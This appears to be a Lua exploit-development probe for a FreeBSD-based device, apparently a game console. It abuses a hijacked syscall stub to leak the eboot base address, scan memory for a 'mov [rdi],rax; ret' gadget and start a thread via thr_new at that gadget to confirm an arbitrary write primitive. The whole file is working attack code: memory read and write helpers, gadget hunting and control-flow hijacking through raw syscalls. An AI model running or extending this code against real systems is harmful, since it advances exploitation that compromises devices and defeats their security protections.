-- CRASH_CLASS: MODERATE
-- PROBE 56l: thr_new(455) with real struct thr_param — minimal test

print("=== PROBE 56l: THR_NEW REAL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

local sc455 = mk(455)
local sc433 = mk(433)
local sc_mmap = mk(477)

-- ============ A: jmp$ park — known to work from 383a ============
print("")
print("--- A: thr_new with jmp$ (park) ---")

local stack1 = sc_mmap(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local tid_p = memory.alloc(8)
wq(tid_p, uint64(0))

local p1 = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(p1) + i, 0) end
wq(p1, eaddr(0x15481))                          -- start_func = jmp$
wq(uint64(N(p1) + 0x08), uint64(0x42424242))    -- arg
wq(uint64(N(p1) + 0x10), uint64(N(stack1)))     -- stack_base
wq(uint64(N(p1) + 0x18), uint64(0x10000))       -- stack_size
wq(uint64(N(p1) + 0x30), uint64(N(tid_p)))      -- child_tid

local ok1, ret1 = pcall(function()
    return sc455(uint64(N(p1)), uint64(0x38))
end)
print("  ret=" .. (ok1 and tostring(N(ret1)) or "FAIL"))

local x = 0; for k = 1, 60000 do x = x + k end

local tid1 = rq(tid_p)
print("  child_tid=" .. fmt(tid1))

if tid1 then
    local tn = N(tid1)
    if tn > 0 then
        local ok3, rv3 = pcall(function() return sc433(uint64(tn), uint64(0)) end)
        print("  thr_kill(child,0)=" .. (ok3 and tostring(N(rv3)) or "FAIL"))
    end
end
print("  alive=" .. tostring(alive()))

if not alive() then print("DEAD"); return end

-- ============ B: Find write gadget in first 8KB ============
print("")
print("--- B: scan for mov [rdi],rax;ret ---")

local wg = nil
for off = 0, 0x2000, 4 do
    local dw = rd(tlo + off)
    if dw and dw == 0xC3078948 then
        wg = off
        print(string.format("  ALIGNED at eboot+0x%X", off))
        break
    end
end

if not wg then
    print("  Not in first 8KB aligned. Try 48 89 07 C3 at +1 offset...")
    for off = 0, 0x2000, 4 do
        local dw = rd(tlo + off)
        local dw2 = rd(tlo + off + 4)
        if dw and dw2 then
            local b1 = math.floor(dw / 256) % 256
            local b2 = math.floor(dw / 65536) % 256
            local b3 = math.floor(dw / 16777216) % 256
            local b4 = dw2 % 256
            if b1 == 0x48 and b2 == 0x89 and b3 == 0x07 and b4 == 0xC3 then
                wg = off + 1
                print(string.format("  Found at eboot+0x%X (+1)", wg))
                break
            end
        end
    end
end

if wg then
    print("")
    print("--- C: arg delivery test ---")

    local marker_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local ma = N(marker_page)
    wq(marker_page, uint64(0xDEAD0003DEAD0003))
    print("  marker before=" .. fmt(rq(marker_page)))

    local stack2 = sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    -- Fill return address slots on stack so child doesn't crash after ret
    for i = 0, 0x100, 8 do
        wq(uint64(N(stack2) + 0xF000 + i), eaddr(0x15481))  -- jmp$ as return
    end

    local tid_p2 = memory.alloc(8)
    wq(tid_p2, uint64(0))

    local p2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(p2) + i, 0) end
    wq(p2, eaddr(wg))                              -- start_func = mov [rdi],rax;ret
    wq(uint64(N(p2) + 0x08), uint64(ma))           -- arg = marker address
    wq(uint64(N(p2) + 0x10), uint64(N(stack2)))    -- stack_base
    wq(uint64(N(p2) + 0x18), uint64(0x10000))      -- stack_size
    wq(uint64(N(p2) + 0x30), uint64(N(tid_p2)))    -- child_tid

    local ok2, ret2 = pcall(function()
        return sc455(uint64(N(p2)), uint64(0x38))
    end)
    print("  ret=" .. (ok2 and tostring(N(ret2)) or "FAIL"))

    x = 0; for k = 1, 100000 do x = x + k end

    local tid2 = rq(tid_p2)
    print("  child_tid=" .. fmt(tid2))
    print("  marker after=" .. fmt(rq(marker_page)))

    local mv = rq(marker_page)
    if mv then
        local mh2, ml2
        if type(mv) == "table" and mv.h then mh2 = mv.h; ml2 = mv.l
        else mh2 = 0; ml2 = N(mv) end
        if mh2 < 0 then mh2 = mh2 + 0x100000000 end
        if ml2 < 0 then ml2 = ml2 + 0x100000000 end
        if mh2 == 0xDEAD0003 and ml2 == 0xDEAD0003 then
            print("  UNCHANGED — arg NOT in rdi (or rax=same sentinel)")
        else
            print("  *** CHANGED *** — write primitive via thr_new confirmed!")
        end
    end
else
    print("  write gadget not found in 8KB range")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56l COMPLETE ===")
